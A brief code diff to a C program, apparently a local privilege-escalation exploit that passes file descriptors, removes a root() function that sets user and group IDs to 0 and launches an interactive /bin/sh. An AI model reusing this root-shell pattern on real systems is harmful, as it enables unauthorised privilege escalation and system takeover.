@@ -113,14 +113,6 @@ int recv_fd()
 	return fd;
 }
 
-void root()
-{
-	dup2(6, 2);
-	setuid(0);
-	setgid(0);
-	execl("/bin/sh", "sh", "-i", NULL);
-}
-
 int main(int argc, char **argv)
 {
 	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
